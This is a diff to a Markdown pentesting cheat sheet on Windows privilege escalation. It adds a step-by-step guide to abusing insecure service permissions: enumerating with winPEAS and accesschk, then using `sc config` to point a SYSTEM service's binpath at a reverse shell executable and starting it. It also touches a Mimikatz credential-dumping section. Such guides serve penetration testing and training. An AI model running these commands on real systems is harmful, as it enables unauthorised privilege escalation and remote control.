@@ -468,6 +468,82 @@ Do BUILTIN\Users have F, M or R, or W?
 * R = Read-only access
 * W = Write-only access
 
+### Service Commands
+
+Query the configuration of a service:
+
+```text
+> sc.exe qc <name>
+```
+
+Query the current status of a service:
+
+```text
+> sc.exe query <name>
+```
+
+Modify a configuration option of a service:
+
+```text
+> sc.exe config <name> <option>= <value>
+```
+
+Start/Stop a service:
+
+```text
+> net start/stop <name>
+```
+
+### Insecure Service Permissions
+
+Each service has an ACL that specifies permissions specific to that service.
+
+Services Permissions:
+
+* SERVICE\_QUERY\_CONFIG, SERVICE\_QUERY\_STATUS
+* SERVICE\_STOP, SERVICE\_START
+* SERVICE\_CHANGE\_CONFIG, SERVICE\_ALL\_ACCESS
+
+If our user has the ability to change the configuration of a service that runs with SYSTEM privileges, we can replace the service's executable with one of our own. You might not be able to elevate privileges if you can change a service's settings but not stop/start it!
+
+#### Insecure Service Privilege Escalation 
+
+Use winPEAS to check for service misconfigurations:
+
+```text
+> .\winPEASany.exe quiet servicesinfo
+```
+
+1. We can confirm this with accesschk.exe:
+
+   ```text
+   > .\accesschk.exe /accepteula -uwcqv user <service_name>
+   ```
+
+2. Check the current configuration of the service:
+
+   ```text
+   > sc qc <service_name>
+   ```
+
+3. Check the current status of the service:
+
+   ```text
+   > sc query <service_name>
+   ```
+
+4. Reconfigure the service binary path to use our reverse shell executable:
+
+   ```text
+   > sc config <service_name> binpath= "\"C:\Users\Public\reverse.exe\""
+   ```
+
+5. Start a listener on Kali, and then start the service to trigger the exploit:
+
+   ```text
+   > net start <service_name>
+   ```
+
 ### Unquoted Service Path
 
 
@@ -895,7 +971,7 @@ Create a dump file:
 
 Then you will receive this message:
 
-![Dumping process done](../.gitbook/assets/image%20%2826%29.png)
+![](../.gitbook/assets/image%20%2826%29.png)
 
 Mimikatz can then dump the plaintext login credentials:
 
